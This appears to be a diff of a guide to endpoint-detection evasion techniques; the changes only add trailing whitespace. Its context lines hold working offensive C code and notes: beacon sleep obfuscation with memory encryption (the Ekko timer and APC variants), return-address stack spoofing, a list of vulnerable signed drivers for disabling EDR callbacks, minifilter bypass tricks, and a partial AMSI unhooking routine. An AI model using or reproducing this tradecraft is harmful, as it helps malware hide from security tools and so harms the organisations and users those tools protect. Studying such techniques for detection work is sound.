@@ -224,13 +224,13 @@ void SleepEncrypt(DWORD sleepTime) {
     // 1. Encrypt all RX sections with XOR/RC4
     BYTE key[16]; GenerateRandomKey(key);
     EncryptMemory(beaconBase, beaconSize, key);
-
+    
     // 2. Change memory protection to RW (no execute)
     VirtualProtect(beaconBase, beaconSize, PAGE_READWRITE, &old);
-
+    
     // 3. Sleep
     SleepEx(sleepTime, FALSE);
-
+    
     // 4. Restore RX and decrypt
     VirtualProtect(beaconBase, beaconSize, PAGE_EXECUTE_READ, &old);
     DecryptMemory(beaconBase, beaconSize, key);
@@ -267,7 +267,7 @@ SHA256(computerName, strlen(computerName), key);
 ### Ekko (Timer-Based)
 ```c
 // Use NtCreateTimerQueue + NtSetTimer to encrypt/decrypt beacon memory
-// Flow: Set timer → encrypt memory → change to RW → sleep → timer fires →
+// Flow: Set timer → encrypt memory → change to RW → sleep → timer fires → 
 //       change to RX → decrypt memory → resume execution
 
 HANDLE hTimerQueue = NULL;
@@ -278,7 +278,7 @@ CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureCo
 // 2. VirtualProtect → RW
 // 3. SystemFunction032 (RC4 encrypt) → encrypt beacon
 // 4. WaitForSingleObject → actual sleep
-// 5. SystemFunction032 → decrypt beacon
+// 5. SystemFunction032 → decrypt beacon  
 // 6. VirtualProtect → RX
 // 7. NtContinue → resume execution
 
@@ -291,7 +291,7 @@ CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)RtlCaptureCo
 // Queue APCs to current thread for sleep obfuscation
 // Each APC performs one step of the encrypt-sleep-decrypt chain
 
-NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)VirtualProtect,
+NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)VirtualProtect, 
     beaconBase, beaconSize, PAGE_READWRITE);
 NtQueueApcThread(GetCurrentThread(), (PPS_APC_ROUTINE)SystemFunction032,
     &img, &key);  // RC4 encrypt
@@ -356,13 +356,13 @@ WaitForThreadpoolWorkCallbacks(decryptWork, FALSE);
 void SpoofStack(PVOID targetFunc, PVOID fakeRetAddr) {
     // Save real return address
     PVOID realRet = _ReturnAddress();
-
+    
     // Overwrite return address on stack with legitimate ntdll address
     *(PVOID*)(_AddressOfReturnAddress()) = fakeRetAddr;
-
+    
     // Call target function — EDR sees clean return address
     targetFunc();
-
+    
     // Restore real return address
     *(PVOID*)(_AddressOfReturnAddress()) = realRet;
 }
@@ -419,7 +419,7 @@ typedef struct _STACK_FRAME {
 ```c
 // EDR kernel drivers register callbacks that fire on:
 // PsSetCreateProcessNotifyRoutineEx — process creation
-// PsSetCreateThreadNotifyRoutine — thread creation
+// PsSetCreateThreadNotifyRoutine — thread creation  
 // PsSetLoadImageNotifyRoutine — DLL/image loading
 // ObRegisterCallbacks — handle operations (open process/thread)
 // CmRegisterCallback — registry operations
@@ -434,7 +434,7 @@ typedef struct _STACK_FRAME {
 
 // Known BYOVD targets (signed, vulnerable):
 // RTCore64.sys — MSI Afterburner (arbitrary R/W)
-// dbutil_2_3.sys — Dell BIOS utility (arbitrary R/W)
+// dbutil_2_3.sys — Dell BIOS utility (arbitrary R/W)  
 // gdrv.sys — GIGABYTE driver (arbitrary R/W)
 // ene.sys — ENE Technology (arbitrary R/W)
 // WinRing0x64.sys — OpenHardwareMonitor (arbitrary R/W)
@@ -450,7 +450,7 @@ typedef struct _STACK_FRAME {
 //    Open \\.\PhysicalDrive0, read MFT, parse NTFS structures
 // 2. Reparse point abuse — redirect file operations
 // 3. Symbolic link manipulation
-// 4. Transaction rollback (TxF) — write in transaction, EDR sees, rollback,
+// 4. Transaction rollback (TxF) — write in transaction, EDR sees, rollback, 
 //    then write again without transaction flag
 
 // Altitude ranges:
@@ -529,7 +529,7 @@ VirtualProtect((LPVOID)((BYTE*)hModule + text->VirtualAddress),
 // 1. Create section from DLL on disk (read-only mapping)
 HANDLE hFile = CreateFileA("C:\\Windows\\System32\\amsi.dll", ...);
 HANDLE hSection;
-NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL,
+NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, 
     PAGE_READONLY, SEC_IMAGE, hFile);
 
 // 2. Map writable view (local)
